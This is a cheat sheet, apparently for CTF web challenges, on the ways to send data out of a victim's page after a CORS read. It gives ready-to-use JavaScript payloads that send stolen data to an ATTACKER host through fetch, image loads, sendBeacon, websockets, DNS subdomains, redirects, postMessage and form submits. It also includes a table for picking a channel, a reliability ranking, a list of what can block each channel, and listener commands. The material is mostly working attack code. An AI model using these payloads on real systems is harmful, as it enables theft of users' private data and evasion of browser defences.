# Exfil channels — every way the read data leaves the page

The CORS read returns the data to YOUR page's JS — the exfil is the
second fetch that carries it to you. Every channel, with its reach
and its gate.

---

## 1. The GET-with-data — the canonical exfil

```js
fetch('https://ATTACKER/?d='+btoa(JSON.stringify(data)))
```

A GET to your listener — the data in the URL/query. The simplest;
needs the page's CSP to allow the fetch and the bot to reach your
domain.

## 2. The image-GET — a no-CORS exfil

```js
new Image().src = 'https://ATTACKER/x?d='+btoa(JSON.stringify(data))
```

An `<img>` load carries cookies on a cross-site request and needs
no CORS — a reliable exfil channel when fetch-CSP blocks.

## 3. The sendBeacon — fire-and-forget

```js
navigator.sendBeacon('https://ATTACKER/', JSON.stringify(data))
```

A POST the browser fires even as the page unloads — reliable for a
bot that navigates away.

## 4. The websocket — a persistent channel

```js
var w=new WebSocket('wss://ATTACKER/x');
w.onopen=()=>{ /* read, then w.send(data) */ };
```

A ws connection isn't CORS-gated — a live channel for larger data.

## 5. The POST-with-body — a structured exfil

```js
fetch('https://ATTACKER/',{method:'POST',mode:'no-cors',body:JSON.stringify(data)})
```

A `no-cors` POST — opaque but fires — the data in the body.

## 6. The DNS-exfil — for a blocked-domain bot

```js
new Image().src='https://'+btoa(data)+'.ATTACKER.com/'
```

The data as a subdomain — a DNS query carries it. For when HTTP to
your domain is blocked but DNS resolves.

## 7. The write-back — the data lands on the target

```js
fetch('https://TARGET/api/comment',{method:'POST',credentials:'include',
  headers:{'Content-Type':'application/json'},
  body:JSON.stringify({text:data.flag})})
```

The flag lands in a comment/profile you read same-origin — no
external exfil needed.

## 8. The DOM-writeback — a page-side readback

```js
document.body.innerText = JSON.stringify(data)
// a bot that screenshots the page captures the flag
// or a page whose DOM you read later
```

## 9. The redirect-load — the flag in the URL

```js
location='https://ATTACKER/?f='+data.flag
```

The whole page navigates — the flag in the URL — a simple reliable
exfil that also 'proves' the read by the page's departure.

## 10. The postMessage — a parent-frame exfil

```js
parent.postMessage(JSON.stringify(data),'*')
// or top.postMessage — for an iframe-context page
```

For a page embedded in an attacker frame — the parent receives it.

## 11. The form-submit — a no-JS-needed exfil

```html
<form action="https://ATTACKER/x" method="POST">
  <input name="d" id=d>
</form>
<script>/* read */ document.getElementById('d').value=data.flag;
document.forms[0].submit()</script>
```

## 12. The channel-selection table — which exfil for which constraint

```text
constraint                          channel
the bot reaches your domain         fetch/img/beacon — any
a fetch-blocking CSP                img/beacon/form — no-CORS
the bot can't reach your domain     write-back / DOM-writeback / DNS
a page-unload risk                  sendBeacon
a large payload                     websocket / POST
an iframe context                   postMessage
a same-origin readback surface      write-back (a comment/profile)
a screenshotting bot                DOM-writeback
```

## 13. The exfil-reliability ordering

```text
1. a fetch GET — the canonical, needs the domain reachable + CSP
2. an img GET — no-CORS, more reliable than a fetch under CSP
3. a sendBeacon — fire-and-forget, survives unload
4. a ws — a live channel for big data
5. a write-back — no external exfil needed
6. a DOM-writeback — for a screenshotting bot
7. a DNS exfil — for a blocked-domain bot
```

## 14. The exfil-gate analysis — what can block it

```text
a page CSP — a connect-src/img-src that excludes your domain
a blocked domain — a bot that can't reach attacker.com
a SameSite on your listener — doesn't matter — it's your domain
a corporate proxy — a bot behind a proxy that filters
the data's size — a query-string exfil caps ~8KB — a POST/ws for more
```

## 15. The exfil-evidence — the OOB hit as the readback

```bash
# the listener captures the hit — the read's proof
python3 tools/web/oob_listener.py serve --port 8001 &
python3 tools/web/oob_listener.py hits
# a hit with the data → the read+exfil worked → decode → the flag
```
